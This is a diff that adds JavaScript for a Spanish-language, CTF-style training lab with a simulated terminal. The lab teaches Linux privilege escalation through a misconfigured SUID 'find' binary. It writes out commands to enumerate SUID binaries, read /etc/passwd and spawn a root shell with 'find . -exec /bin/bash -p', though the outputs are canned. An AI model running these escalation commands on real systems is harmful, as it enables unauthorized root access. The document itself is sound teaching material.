+        '<strong style="color:#e0e0e8">find / -perm -4000 -type f</strong> enumera todos los binarios con SUID activo en el sistema.',
+      ],
+      tools:[
+        { cmd:'find / -perm -4000 -type f 2>/dev/null', desc:'Busca binarios con bit SUID activo' },
+        { cmd:'ls -la /usr/bin/<binario>', desc:'Verifica dueño y permisos del binario sospechoso' },
+        { cmd:'/usr/bin/find . -exec whoami \\;', desc:'Prueba si se ejecuta como root via SUID' },
+        { cmd:'/usr/bin/find . -exec /bin/bash -p \\;', desc:'Obtiene shell root aprovechando el SUID de find' },
+      ],
+      why:'La escalada de privilegios es la diferencia entre un acceso parcial y el control total del sistema. Una vez como root, el atacante puede instalar backdoors, exfiltrar cualquier dato, o usar el servidor como pivote. Para defensores, es crítico auditar los binarios SUID y aplicar el principio de mínimo privilegio.',
+    },
+    desc:'Tienes acceso como usuario www-data en un servidor. Escala privilegios a root explotando un binario SUID mal configurado.',
+    objectives:['Enumerar binarios SUID','Identificar el binario explotable','Escalar a root y leer la flag'],
+    hints:['find / -perm -4000 busca SUID','GTFObins tiene exploits para binarios comunes','/usr/bin/find con SUID puede ejecutar comandos como root','Una vez root, la flag está en /root/root.txt'],
+    prompt:'www-data@webserver:/var/www$',
+    startMsg:`<span style="color:#ff5555">╔══ MISIÓN: Privilege Escalation ══╗</span>
+<span style="color:#606070">Usuario actual : </span><span style="color:#e0e0e8">www-data</span>
+<span style="color:#606070">Objetivo       : </span><span style="color:#ff5555">root</span>
+<span style="color:#505060">──────────────────────────────────────</span>
+<span style="color:#808090">Tienes acceso limitado. Escala a root.</span>`,
+    state:{},
+    commands:{
+      'whoami': `www-data`,
+      'id': `uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
+      'sudo -l': `Sorry, user www-data may not run sudo on this server.`,
+      'find / -perm -4000 -type f 2>/dev/null': `/usr/bin/passwd
+/usr/bin/su
+/usr/bin/newgrp
+<span style="color:#ff9500">/usr/bin/find</span>  ← SUID activado (inusual)
+/usr/bin/mount
+/bin/ping`,
+      'ls -la /usr/bin/find': `-rwsr-xr-x 1 root root 224112 Feb 18 2020 <span style="color:#ff5555">/usr/bin/find</span>
+<span style="color:#ff9500">→ Bit SUID activo — se ejecuta como root</span>`,
+      '/usr/bin/find . -exec whoami \\;': `<span style="color:#ff5555">root</span>
+<span style="color:#00ff88">→ ¡Ejecutamos comandos como root!</span>`,
+      '/usr/bin/find . -exec cat /root/root.txt \\;': `<span style="color:#ff5555">cat: /root/root.txt: Permission denied</span>
+<span style="color:#808090">→ find sigue siendo www-data para I/O. Necesitas una shell.</span>`,
+      '/usr/bin/find . -exec /bin/bash -p \\;': `<span style="color:#ff5555">bash-5.0# </span><span style="color:#00ff88">← Shell root obtenida!</span>`,
+      'cat /root/root.txt': `<span style="color:#00ff88">✔ ¡FLAG ROOT ENCONTRADA!</span>
+<span style="color:#a78bfa">╔══════════════════════════════════════════╗</span>
+<span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{su1d_f1nd_pr1v_3sc_r00t!}</span>       <span style="color:#a78bfa">║</span>
+<span style="color:#a78bfa">╚══════════════════════════════════════════╝</span>
+<span style="color:#808090">+350 XP — ¡Root obtenido! Nivel Avanzado 💀🔥</span>`,
+      'uname -a': `Linux webserver 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 GNU/Linux`,
+      'cat /etc/passwd | grep -v nologin': `root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/sh
+john:x:1001:1001::/home/john:/bin/bash`,
+      'help': `Comandos disponibles:
+  whoami / id                          — info de usuario
+  sudo -l                              — permisos sudo
+  find / -perm -4000 -type f           — buscar SUID
+  ls -la &lt;archivo&gt;                     — permisos
+  /usr/bin/find . -exec &lt;cmd&gt; \\;      — exec via SUID
+  cat &lt;archivo&gt;                        — leer archivo
+  uname -a                             — info del kernel
+  hint                                 — pedir pista`,
+    }
+  }
+];
+
+let currentLab = LABS[0];
+let hintIndex = 0;
+
+function labPrint(html) {
+  const term = document.getElementById('labTerminal');
+  const line = document.createElement('div');
+  line.innerHTML = html;
+  term.appendChild(line);
+  term.scrollTop = term.scrollHeight;
+}
+
+function labPrintCmd(cmd) {
+  const prompt = document.getElementById('labPrompt').textContent;
+  labPrint(`<span style="color:#a78bfa">${prompt}</span> <span style="color:#e0e0e8">${cmd.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</span>`);
+}
+
+function labClear() {
+  document.getElementById('labTerminal').innerHTML = '';
+  hintIndex = 0;
+}
+
+function loadTheory(lab) {
+  const t = lab.theory;
+  const badge = document.getElementById('theoryBadge');
+  badge.textContent = lab.difficulty;
+  badge.style.background = lab.diffColor + '22';
+  badge.style.color = lab.diffColor;
+  document.getElementById('theoryTitle').textContent = lab.title;
+  document.getElementById('theoryConcept').textContent = t.concept;
+  const ul = document.getElementById('theoryPoints');
+  ul.innerHTML = t.points.map(p => `<li>${p}</li>`).join('');
+  const toolsEl = document.getElementById('theoryTools');
+  toolsEl.innerHTML = t.tools.map(t =>
+    `<code class="theory-cmd">${t.cmd.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code>
+     <span style="font-size:0.65rem;color:#606075;display:block;margin-bottom:6px;padding-left:4px">${t.desc}</span>`
+  ).join('');
+  document.getElementById('theoryWhy').textContent = t.why;
+  document.getElementById('theoryPanel').classList.add('visible');
+}
+
+function loadLab(lab) {
+  currentLab = lab;
+  hintIndex = 0;
+  document.getElementById('labTitle').textContent = lab.title;
+  document.getElementById('labDesc').textContent = lab.desc;
+  document.getElementById('labDifficulty').textContent = lab.difficulty;
+  document.getElementById('labDifficulty').style.background = lab.diffColor+'22';
+  document.getElementById('labDifficulty').style.color = lab.diffColor;
+  document.getElementById('labPrompt').textContent = lab.prompt;
+  const obj = document.getElementById('labObjectives');
+  obj.innerHTML = lab.objectives.map((o,i)=>
+    `<span style="font-size:0.62rem;padding:2px 8px;border-radius:12px;background:rgba(167,139,250,0.1);color:#a78bfa;border:1px solid rgba(167,139,250,0.2)">${i+1}. ${o}</span>`
+  ).join('');
+  // sidebar active
+  document.querySelectorAll('.lab-item').forEach(el=>{
+    el.style.background = el.dataset.id===lab.id ? 'rgba(167,139,250,0.12)' : '';
+    const isMob = window.innerWidth <= 768;
+    if (isMob) {
+      el.style.borderLeft = 'none';
+      el.style.borderBottom = el.dataset.id===lab.id ? '3px solid #a78bfa' : '3px solid transparent';
+    } else {
+      el.style.borderLeft = el.dataset.id===lab.id ? '3px solid #a78bfa' : '3px solid transparent';
+      el.style.borderBottom = '';
+    }
+  });
+  labClear();
+  labPrint(lab.startMsg);
+  labPrint('');
+  // Show theory panel
+  loadTheory(lab);
+}
+
+function runLabCommand(raw) {
+  const cmd = raw.trim();
+  if (!cmd) return;
+  labPrintCmd(cmd);
+  if (cmd === 'clear') { labClear(); labPrint(currentLab.startMsg); labPrint(''); return; }
+  if (cmd === 'hint') {
+    const h = currentLab.hints[hintIndex % currentLab.hints.length];
+    labPrint(`<span style="color:#ff9500">💡 Pista: ${h}</span>`);
+    hintIndex++; return;
+  }
+  // fuzzy match: normalize spaces
+  const norm = cmd.replace(/\s+/g,' ');
+  let found = currentLab.commands[norm] || currentLab.commands[cmd];
+  if (!found) {
+    // partial match
+    const keys = Object.keys(currentLab.commands);
+    const match = keys.find(k => norm.startsWith(k.split(' ')[0]) && k !== 'help');
+    if (match && Math.abs(norm.length - match.length) < 8) found = currentLab.commands[match];
+  }
+  if (found) {
+    labPrint(`<span style="color:#c0c0d0">${found}</span>`);
+  } else {
+    labPrint(`<span style="color:#ff5555">bash: ${cmd.split(' ')[0]}: command not found</span>`);
+    labPrint(`<span style="color:#505060">Escribe <span style="color:#a78bfa">help</span> para ver comandos disponibles</span>`);
+  }
+  labPrint('');
+}
+
+// Theory panel buttons
+document.getElementById('theoryStartBtn').addEventListener('click', () => {
+  document.getElementById('theoryPanel').classList.remove('visible');
+  setTimeout(() => document.getElementById('labInput').focus(), 100);
+});
+document.getElementById('theoryToggleBtn').addEventListener('click', () => {
+  loadTheory(currentLab);
+});
+
+// Build sidebar
+const sidebar = document.getElementById('labSidebar');
+LABS.forEach(lab => {
+  const item = document.createElement('div');
+  item.className = 'lab-item';
+  item.dataset.id = lab.id;
+  item.style.cssText = 'padding:10px 14px;cursor:pointer;border-left:3px solid transparent;transition:all 0.15s';
+  item.innerHTML = `<div style="font-size:0.72rem;color:#c0c0d0;margin-bottom:3px">${lab.title}</div>
+    <span style="font-size:0.58rem;font-weight:700;padding:1px 6px;border-radius:10px;background:${lab.diffColor}22;color:${lab.diffColor}">${lab.difficulty}</span>`;
+  item.addEventListener('click', () => loadLab(lab));
+  item.addEventListener('mouseenter', () => { if(item.dataset.id !== currentLab.id) item.style.background='rgba(255,255,255,0.04)'; });
+  item.addEventListener('mouseleave', () => { if(item.dataset.id !== currentLab.id) item.style.background=''; });
+  sidebar.appendChild(item);
+});
+
+// Input handling
+document.getElementById('labRun').addEventListener('click', () => {
+  const inp = document.getElementById('labInput');
+  runLabCommand(inp.value);
+  inp.value = '';
+  inp.focus();
+});
+document.getElementById('labInput').addEventListener('keydown', e => {
+  if (e.key === 'Enter') {
+    const inp = e.target;
+    runLabCommand(inp.value);
+    inp.value = '';
+  }
+});
+document.getElementById('labHint').addEventListener('click', () => runLabCommand('hint'));
+document.getElementById('labReset').addEventListener('click', () => loadLab(currentLab));
+
+const labOverlay = document.getElementById('labOverlay');
+document.getElementById('btnLab').addEventListener('click', () => {
+  labOverlay.classList.add('active');
+  if (!document.getElementById('labTerminal').children.length) loadLab(LABS[0]);
+  setTimeout(() => document.getElementById('labInput').focus(), 100);
+});
+document.getElementById('closeLabModal').addEventListener('click', () => labOverlay.classList.remove('active'));
+labOverlay.addEventListener('click', e => { if(e.target===labOverlay) labOverlay.classList.remove('active'); });
 </script>
+
 </body>
 </html>
